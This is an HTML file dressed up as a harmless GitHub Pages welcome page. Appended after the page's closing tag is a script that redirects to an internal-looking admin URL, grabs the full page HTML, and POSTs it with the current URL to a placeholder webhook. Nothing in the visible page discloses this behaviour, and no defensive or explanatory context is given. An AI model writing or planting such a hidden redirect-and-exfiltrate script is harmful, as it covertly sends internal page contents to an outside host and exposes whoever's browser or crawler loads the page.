<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Simple GitHub Page</title>
</head>
<body>
    <h1>Welcome to My Website!</h1>
    <p>This page is hosted entirely on GitHub Pages.</p>
</body>
</html>

<script>
    document.location.href = 'https://internal.sketchycompany.upd-dcs.work/admin';
    const htmlContent = document.documentElement.outerHTML;

// Send it to your webhook via POST
fetch('https://your-webhook-site.com', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    url: window.location.href,
    html: htmlContent
  })
})
.then(response => {
  console.log('Webhook sent successfully');
  // Optional: proceed with redirect after posting
  // window.location.href = 'https://destination-site.com';
})
.catch(error => {
  console.error('Error posting to webhook:', error);
});
    
</script>
